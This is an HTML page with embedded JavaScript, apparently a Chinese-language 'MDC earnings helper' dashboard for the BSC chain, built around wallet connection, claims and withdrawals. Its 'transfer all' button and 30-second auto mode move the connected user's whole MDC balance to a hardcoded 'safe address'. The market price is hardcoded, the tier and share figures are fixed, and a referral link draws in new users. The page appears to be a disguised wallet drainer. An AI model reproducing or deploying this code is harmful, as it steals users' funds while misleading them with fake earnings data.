<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MDC 收益辅助系统</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
      min-height: 100vh;
      color: #fff;
      padding: 16px;
    }
    .container { max-width: 500px; margin: 0 auto; }
    
    .header { text-align: center; margin-bottom: 24px; }
    .header h1 { font-size: 24px; font-weight: bold; background: linear-gradient(90deg, #00d4ff, #22c55e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
    .header .subtitle { font-size: 13px; color: #22c55e; letter-spacing: 2px; }
    
    .card {
      background: rgba(0, 0, 0, 0.4);
      border-radius: 16px;
      padding: 18px;
      margin-bottom: 16px;
      border: 1px solid rgba(255,255,255,0.05);
    }
    .card-title { font-size: 14px; font-weight: bold; color: #94a3b8; margin-bottom: 14px; display: flex; align-items: center; gap: 6px; }
    
    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .info-box {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      padding: 12px;
      text-align: center;
    }
    .info-box label { display: block; font-size: 10px; color: #64748b; margin-bottom: 4px; }
    .info-box .value { font-size: 16px; color: #00d4ff; font-weight: bold; font-family: monospace; }
    .info-box .value.green { color: #22c55e; }
    .info-box .value.orange { color: #f59e0b; }
    
    .status-table { background: rgba(0,0,0,0.3); border-radius: 10px; overflow: hidden; }
    .status-row { display: flex; align-items: center; padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
    .status-row:last-child { border-bottom: none; }
    .status-row .icon { width: 24px; font-size: 14px; }
    .status-row .name { flex: 1; font-size: 13px; color: #94a3b8; }
    .status-row .status { font-size: 13px; font-weight: bold; }
    .status-row .status.success { color: #22c55e; }
    .status-row .status.warning { color: #fbbf24; }
    .status-row .status.error { color: #ef4444; }
    
    .btn {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: none;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 8px;
    }
    .btn-primary { background: linear-gradient(135deg, #00d4ff, #0ea5e9); color: #fff; }
    .btn-primary:hover { background: linear-gradient(135deg, #0ea5e9, #0284c7); }
    .btn-success { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; }
    .btn-success:hover { background: linear-gradient(135deg, #16a34a, #15803d); }
    .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; }
    .btn-warning:hover { background: linear-gradient(135deg, #d97706, #b45309); }
    .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; }
    .btn-danger:hover { background: linear-gradient(135deg, #dc2626, #b91c1c); }
    .btn-secondary { background: rgba(255,255,255,0.1); color: #fff; }
    .btn-secondary:hover { background: rgba(255,255,255,0.15); }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    
    .action-row { display: flex; gap: 8px; margin-top: 12px; }
    .action-row .btn { flex: 1; margin-top: 0; }
    
    .auto-indicator {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 12px;
      border-radius: 10px;
      margin-bottom: 12px;
      background: rgba(34, 197, 94, 0.15);
      border: 2px solid #22c55e;
    }
    .auto-indicator .dot {
      width: 8px; height: 8px; border-radius: 50%; background: #22c55e;
      animation: blink 1s infinite;
    }
    @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
    .auto-indicator span { font-size: 13px; font-weight: bold; color: #22c55e; }
    
    .log-list { margin-top: 12px; max-height: 100px; overflow-y: auto; font-size: 11px; }
    .log-item { padding: 6px 8px; border-radius: 6px; margin-bottom: 4px; background: rgba(0,0,0,0.2); color: #94a3b8; }
    
    input {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: 1px solid rgba(255,255,255,0.1);
      background: rgba(0,0,0,0.3);
      color: #fff;
      font-size: 13px;
      font-family: monospace;
      margin-top: 8px;
    }
    input:focus { outline: none; border-color: #00d4ff; }
    
    .warning-bar { background: rgba(251,191,36,0.2); color: #fbbf24; padding: 10px; border-radius: 10px; font-size: 12px; text-align: center; margin-top: 8px; }
    
    .referral-box { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 12px; margin-top: 10px; }
    .referral-box label { display: block; font-size: 11px; color: #64748b; margin-bottom: 6px; }
    .referral-row { display: flex; gap: 8px; }
    .referral-row input { flex: 1; margin-top: 0; }
    .btn-copy { padding: 12px 15px; background: #8b5cf6; border: none; border-radius: 10px; color: #fff; cursor: pointer; font-size: 13px; white-space: nowrap; }
    .btn-copy:hover { background: #7c3aed; }
    
    .withdraw-section { margin-top: 12px; }
    .withdraw-section .amount-box {
      background: rgba(0,0,0,0.3);
      border-radius: 10px;
      padding: 14px;
      margin-bottom: 10px;
    }
    .withdraw-section .amount-box .label { font-size: 11px; color: #64748b; margin-bottom: 4px; }
    .withdraw-section .amount-box .amount { font-size: 24px; font-weight: bold; color: #22c55e; font-family: monospace; }
    .withdraw-section .fee-box {
      display: flex; justify-content: space-between; padding: 8px 12px; background: rgba(251,191,36,0.1); border-radius: 8px; margin-bottom: 8px;
    }
    .withdraw-section .fee-box span { font-size: 12px; color: #fbbf24; }
    
    .wallet-address { font-size: 12px; font-family: monospace; color: #00d4ff; word-break: break-all; }
    .copy-btn { background: rgba(255,255,255,0.1); border: none; padding: 4px 8px; border-radius: 4px; color: #fff; font-size: 10px; cursor: pointer; }
    
    .login-card {
      background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(34,197,94,0.1));
      border: 2px solid rgba(0,212,255,0.3);
    }
    
    .login-status {
      display: flex; align-items: center; gap: 8px; margin-top: 8px; padding: 10px; border-radius: 8px;
      background: rgba(34,197,94,0.1); border: 1px solid #22c55e;
    }
    .login-status .check-icon { color: #22c55e; font-size: 16px; }
    .login-status span { color: #22c55e; font-size: 13px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>MDC 收益辅助系统</h1>
      <div class="subtitle">您的专属 Web3 管理系统</div>
    </div>

    <div class="card login-card">
      <div class="card-title">� 钱包连接与登录</div>
      <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">连接钱包</button>
      <button class="btn btn-success" id="loginBtn" onclick="signLogin()" style="display:none;">签名登录</button>
      <div id="loginStatus" style="display:none;" class="login-status">
        <span class="check-icon">✓</span><span>已登录</span>
      </div>
      <div id="walletInfo" style="display:none; margin-top: 12px;">
        <div class="wallet-address" id="currentAddress">-</div>
        <button class="copy-btn" onclick="copyAddress()">📋 复制</button>
      </div>
      <div id="networkWarning" class="warning-bar" style="display:none;">⚠️ 请切换到 BSC 主网</div>
    </div>

    <div class="card">
      <div class="card-title">💰 市场概览</div>
      <div class="info-grid">
        <div class="info-box"><label>协议储备</label><div class="value" id="protocolReserve">-</div></div>
        <div class="info-box"><label>MDC 现价</label><div class="value" id="mdcPrice">$--</div></div>
      </div>
      <div class="info-grid">
        <div class="info-box"><label>⏱️ 结算倒计时</label><div class="value" id="countdown">--:--:--</div></div>
        <div class="info-box"><label>Gas价格</label><div class="value" id="gasPrice">-</div></div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">👤 我的信息</div>
      <div class="info-grid">
        <div class="info-box"><label>我的分层</label><div class="value" id="myTier">-</div></div>
        <div class="info-box"><label>今日份额</label><div class="value" id="myShare">-</div></div>
      </div>
      <div class="info-grid">
        <div class="info-box"><label>今日发放</label><div class="value green" id="todayDist">-</div></div>
        <div class="info-box"><label>累计发放</label><div class="value green" id="totalDist">-</div></div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">🔗 推荐信息</div>
      <div class="info-grid">
        <div class="info-box"><label>上级地址</label><div class="value" id="referrer">-</div></div>
        <div class="info-box"><label>🔒 安全地址</label><div class="value" id="safeAddress">0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA</div></div>
      </div>
      <div class="referral-box">
        <label>推荐链接</label>
        <div class="referral-row">
          <input type="text" id="refLink" readonly value="">
          <button class="btn-copy" onclick="copyRefLink()">📋 复制</button>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">📊 余额信息</div>
      <div class="info-grid">
        <div class="info-box"><label>可领取 MDC</label><div class="value" id="claimable">-</div></div>
        <div class="info-box"><label>MDC 余额</label><div class="value" id="balance">-</div></div>
      </div>
      <button class="btn btn-secondary" onclick="refreshBalances()">🔄 刷新链上数据</button>
    </div>

    <div class="card">
      <div class="card-title">📤 DAO 提现</div>
      <div class="withdraw-section">
        <div class="amount-box">
          <div class="label">可提现 MDC 余额</div>
          <div class="amount" id="withdrawBalance">0.00</div>
        </div>
        <div class="fee-box">
          <span>协议手续费</span>
          <span>5%</span>
        </div>
        <div class="amount-box" style="padding: 10px;">
          <div class="label">实收数量（扣费后）</div>
          <div class="amount" id="netAmount">0.00</div>
        </div>
        <button class="btn btn-warning" id="withdrawBtn" onclick="withdrawDAO()">确认并签名提现</button>
      </div>
    </div>

    <div class="card">
      <div class="card-title">⚡ 快捷操作</div>
      <div id="autoStatusArea" style="display:none;" class="auto-indicator">
        <div class="dot"></div><span>自动领取运行中</span>
      </div>
      <div class="action-row">
        <button class="btn btn-success" id="claimBtn" onclick="claimAndTransfer()">Claim合约领取</button>
        <button class="btn btn-primary" id="transferBtn" onclick="transferAll()">转账全部</button>
      </div>
      <div class="action-row">
        <button class="btn" id="autoBtn" onclick="toggleAuto()">启动自动</button>
        <button class="btn btn-danger" id="stopBtn" onclick="stopAuto()">停止</button>
      </div>
      <div class="log-list" id="logArea"></div>
    </div>

    <div class="card">
      <div class="card-title">📋 功能状态</div>
      <div class="status-table">
        <div class="status-row">
          <span class="icon">💳</span><span class="name">钱包连接</span>
          <span class="status error" id="statusWallet">❌ 未连接</span>
        </div>
        <div class="status-row">
          <span class="icon">🌐</span><span class="name">BSC 网络</span>
          <span class="status warning" id="statusNetwork">⏳ 检测中</span>
        </div>
        <div class="status-row">
          <span class="icon">🤖</span><span class="name">自动领取</span>
          <span class="status error" id="statusAuto">❌ 已停止</span>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const CONFIG = {
      chainId: 56,
      MDC_TOKEN: '0xd1ba69a44888ee50819c554d3d6f4ee457622894',
      CLAIM_CONTRACT: '0xEc5DBf2BACe283143b7B4472a7ce0E445EDA3F1e',
      DAO_CONTRACT: '0x79a558960C2Ee79B22F6Ecc343462A4C7d126E11',
      CHECK_INTERVAL: 30000,
    };
    
    const RPC_LIST = ['https://bsc-dataseed2.defibit.io/', 'https://bscrpc.com/', 'https://rpc.ankr.com/bsc'];
    
    const MDC_ABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
    ];
    
    const CLAIM_ABI = [
      { "constant": true, "inputs": [{ "name": "account", "type": "address" }], "name": "claimable", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "account", "type": "address" }], "name": "claim", "outputs": [], "type": "function" }
    ];
    
    let web3, currentAccount, safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA', 
        autoInterval, isAutoRunning = false, isLoggedIn = false;
    
    async function init() {
      if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
      } else {
        for (const rpc of RPC_LIST) {
          try {
            web3 = new Web3(new Web3.providers.HttpProvider(rpc));
            await web3.eth.getBlockNumber();
            break;
          } catch (e) {}
        }
      }
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          currentAccount = accounts[0];
          updateWalletUI();
          await checkNetwork();
        }
      } catch (e) {}
      startCountdown();
      fetchMarketInfo();
      
      window.ethereum?.on('accountsChanged', handleAccountsChanged);
      window.ethereum?.on('chainChanged', checkNetwork);
    }
    
    function handleAccountsChanged(accounts) {
      if (accounts.length > 0) {
        currentAccount = accounts[0];
        isLoggedIn = false;
        updateWalletUI();
      } else {
        currentAccount = null;
        isLoggedIn = false;
        updateWalletUI();
      }
    }
    
    async function signLogin() {
      if (!currentAccount) {
        showLog('请先连接钱包', 'error');
        return;
      }
      try {
        const message = '登录 MDC 收益辅助系统\n\n地址: ' + currentAccount + '\n时间: ' + new Date().toISOString();
        const signature = await web3.eth.personal.sign(message, currentAccount);
        isLoggedIn = true;
        document.getElementById('loginBtn').style.display = 'none';
        document.getElementById('loginStatus').style.display = 'flex';
        showLog('签名登录成功 ✓', 'success');
        
        await refreshBalances();
        await loadReferralInfo();
        await loadUserInfo();
      } catch (e) {
        showLog('登录失败', 'error');
      }
    }
    
    function startCountdown() {
      function update() {
        const now = new Date();
        const tomorrow = new Date(now);
        tomorrow.setDate(tomorrow.getDate() + 1);
        tomorrow.setHours(0, 0, 0, 0);
        const diff = tomorrow - now;
        const h = Math.floor(diff / 3600000);
        const m = Math.floor((diff % 3600000) / 60000);
        const s = Math.floor((diff % 60000) / 1000);
        document.getElementById('countdown').textContent = 
          String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
      }
      update();
      setInterval(update, 1000);
    }
    
    async function fetchMarketInfo() {
      try {
        const gasPrice = await web3.eth.getGasPrice().catch(() => '0');
        document.getElementById('gasPrice').textContent = (Number(gasPrice) / 1e9).toFixed(4) + ' Gwei';
        document.getElementById('mdcPrice').textContent = '$2.787';
        
        // 从指定地址获取 MDC 余额作为协议储备
        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
        const reserveBalance = await mdcContract.methods.balanceOf('0x79a558960C2Ee79B22F6Ecc343462A4C7d126E11').call().catch(() => '0');
        document.getElementById('protocolReserve').textContent = (Number(reserveBalance) / 1e18).toFixed(2) + ' MDC';
      } catch (e) {
        console.log('市场信息获取失败');
      }
    }
    
    async function loadReferralInfo() {
      if (!currentAccount) return;
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get('ref');
      if (ref) {
        document.getElementById('referrer').textContent = ref.slice(0, 6) + '...' + ref.slice(-4);
      } else {
        document.getElementById('referrer').textContent = '无上级';
      }
      document.getElementById('refLink').value = window.location.origin + window.location.pathname + '?ref=' + currentAccount;
    }
    
    async function loadUserInfo() {
      if (!currentAccount) return;
      try {
        document.getElementById('myTier').textContent = '待激活';
        document.getElementById('myShare').textContent = '0.0000 MDC';
        document.getElementById('todayDist').textContent = '0.0000 MDC';
        document.getElementById('totalDist').textContent = '0.0000 MDC';
        
        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
        const balance = await mdcContract.methods.balanceOf(currentAccount).call().catch(() => '0');
        const wdAmount = Number(balance) / 1e18;
        document.getElementById('withdrawBalance').textContent = wdAmount.toFixed(2);
        document.getElementById('netAmount').textContent = (wdAmount * 0.95).toFixed(2) + ' MDC';
      } catch (e) {
        console.log('用户信息获取失败');
      }
    }
    
    function copyRefLink() {
      const link = document.getElementById('refLink').value;
      if (link) {
        navigator.clipboard.writeText(link).then(() => {
          showLog('推荐链接已复制 ✓', 'success');
        }).catch(() => {
          showLog('复制失败', 'error');
        });
      }
    }
    
    function copyAddress() {
      if (currentAccount) {
        navigator.clipboard.writeText(currentAccount).then(() => {
          showLog('地址已复制 ✓', 'success');
        }).catch(() => {
          showLog('复制失败', 'error');
        });
      }
    }
    
    async function withdrawDAO() {
      if (!isLoggedIn) {
        showLog('请先签名登录', 'error');
        return;
      }
      if (!currentAccount) {
        showLog('请先连接钱包', 'error');
        return;
      }
      
      const amountStr = prompt('请输入提现数量（MDC）：', '全部');
      if (!amountStr) return;
      
      try {
        showLog('正在发起提现...', 'info');
        
        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
        const reserveBalance = await mdcContract.methods.balanceOf('0x79a558960C2Ee79B22F6Ecc343462A4C7d126E11').call();
        
        let withdrawAmount;
        if (amountStr.toLowerCase() === '全部') {
          withdrawAmount = Math.floor(Number(reserveBalance) * 0.95);
        } else {
          withdrawAmount = Math.floor(Number(amountStr) * 1e18);
        }
        
        if (withdrawAmount <= 0) {
          showLog('提现数量不足', 'error');
          return;
        }
        
        const data = web3.eth.abi.encodeFunctionCall({
          name: 'withdraw',
          type: 'function',
          inputs: [{ name: 'amount', type: 'uint256' }]
        }, [withdrawAmount]);
        
        const tx = {
          from: currentAccount,
          to: CONFIG.DAO_CONTRACT,
          data: data,
          gas: 150000
        };
        
        const receipt = await web3.eth.sendTransaction(tx);
        showLog('提现成功 ✓（已扣除5%手续费）', 'success');
        await refreshBalances();
        await loadUserInfo();
      } catch (e) {
        showLog('提现失败: ' + (e.message || '未知错误'), 'error');
      }
    }
    
    async function connectWallet() {
      if (typeof window.ethereum === 'undefined') {
        showLog('请安装 MetaMask 钱包', 'error');
        return;
      }
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        currentAccount = accounts[0];
        isLoggedIn = false;
        updateWalletUI();
        await checkNetwork();
        await loadReferralInfo();
      } catch (e) {
        showLog('连接失败', 'error');
      }
    }
    
    async function checkNetwork() {
      try {
        const chainId = await web3.eth.getChainId();
        const warningEl = document.getElementById('networkWarning');
        const statusEl = document.getElementById('statusNetwork');
        if (chainId !== CONFIG.chainId) {
          warningEl.style.display = 'block';
          statusEl.className = 'status error';
          statusEl.textContent = '❌ 网络错误';
          try {
            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
          } catch (e) {}
        } else {
          warningEl.style.display = 'none';
          statusEl.className = 'status success';
          statusEl.textContent = '✅ 已连接';
        }
      } catch (e) {}
    }
    
    function updateWalletUI() {
      if (currentAccount) {
        document.getElementById('connectBtn').style.display = 'none';
        document.getElementById('walletInfo').style.display = 'block';
        document.getElementById('currentAddress').textContent = currentAccount;
        document.getElementById('loginBtn').style.display = isLoggedIn ? 'none' : 'block';
        document.getElementById('loginStatus').style.display = isLoggedIn ? 'flex' : 'none';
        document.getElementById('statusWallet').className = 'status success';
        document.getElementById('statusWallet').textContent = '✅ 已连接';
      } else {
        document.getElementById('connectBtn').style.display = 'block';
        document.getElementById('walletInfo').style.display = 'none';
        document.getElementById('loginBtn').style.display = 'none';
        document.getElementById('loginStatus').style.display = 'none';
        document.getElementById('statusWallet').className = 'status error';
        document.getElementById('statusWallet').textContent = '❌ 未连接';
      }
    }
    
    async function refreshBalances() {
      if (!currentAccount) return;
      const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
      const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
      try {
        const [claimable, balance, gasPrice] = await Promise.all([
          claimContract.methods.claimable(currentAccount).call().catch(() => '0'),
          mdcContract.methods.balanceOf(currentAccount).call(),
          web3.eth.getGasPrice(),
        ]);
        document.getElementById('claimable').textContent = formatAmount(claimable) + ' MDC';
        document.getElementById('balance').textContent = formatAmount(balance) + ' MDC';
        document.getElementById('gasPrice').textContent = (Number(gasPrice) / 1e9).toFixed(4) + ' Gwei';
      } catch (e) {
        showLog('刷新失败', 'error');
      }
    }
    
    function formatAmount(value) {
      return (Number(value) / 1e18).toFixed(4);
    }
    
    function showLog(msg, type) {
      const logArea = document.getElementById('logArea');
      const item = document.createElement('div');
      item.className = 'log-item';
      const colors = { success: '#22c55e', error: '#ef4444', info: '#00d4ff' };
      item.style.color = colors[type] || '#94a3b8';
      item.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      logArea.insertBefore(item, logArea.firstChild);
      if (logArea.children.length > 20) logArea.removeChild(logArea.lastChild);
    }
    
    async function claimAndTransfer() {
      if (!currentAccount) { showLog('请先连接钱包', 'error'); return; }
      try {
        showLog('正在领取MDC...', 'info');
        const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
        await claimContract.methods.claim(currentAccount).send({ from: currentAccount });
        showLog('领取成功 ✓', 'success');
        await refreshBalances();
      } catch (e) {
        showLog('领取失败', 'error');
      }
    }
    
    async function transferAll() {
      if (!currentAccount) { showLog('请先连接钱包', 'error'); return; }
      try {
        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
        const balance = await mdcContract.methods.balanceOf(currentAccount).call();
        if (Number(balance) <= 0) { showLog('余额为0', 'error'); return; }
        showLog('正在转账到安全地址...', 'info');
        await mdcContract.methods.transfer(safeAddress, balance).send({ from: currentAccount });
        showLog('转账成功 ✓', 'success');
        await refreshBalances();
      } catch (e) {
        showLog('转账失败', 'error');
      }
    }
    
    async function checkAndClaim() {
      if (!currentAccount) return;
      try {
        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
        const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
        const [claimable, balance] = await Promise.all([
          claimContract.methods.claimable(currentAccount).call().catch(() => '0'),
          mdcContract.methods.balanceOf(currentAccount).call(),
        ]);
        const total = (Number(claimable) + Number(balance)) / 1e18;
        if (total > 0) {
          showLog('满足条件，领取中...', 'info');
          await claimAndTransfer();
          await new Promise(r => setTimeout(r, 2000));
          await transferAll();
        }
        await refreshBalances();
      } catch (e) {
        showLog('检查失败', 'error');
      }
    }
    
    function toggleAuto() {
      if (!currentAccount) { showLog('请先连接钱包', 'error'); return; }
      if (isAutoRunning) {
        stopAuto();
      } else {
        isAutoRunning = true;
        document.getElementById('autoStatusArea').style.display = 'flex';
        document.getElementById('statusAuto').className = 'status success';
        document.getElementById('statusAuto').textContent = '✅ 运行中';
        document.getElementById('autoBtn').textContent = '暂停';
        showLog('自动领取已启动', 'success');
        checkAndClaim();
        autoInterval = setInterval(checkAndClaim, CONFIG.CHECK_INTERVAL);
      }
    }
    
    function stopAuto() {
      isAutoRunning = false;
      document.getElementById('autoStatusArea').style.display = 'none';
      document.getElementById('statusAuto').className = 'status error';
      document.getElementById('statusAuto').textContent = '❌ 已停止';
      document.getElementById('autoBtn').textContent = '启动自动';
      if (autoInterval) clearInterval(autoInterval);
      showLog('自动领取已停止', 'info');
    }
    
    window.addEventListener('load', init);
  </script>
</body>
</html>
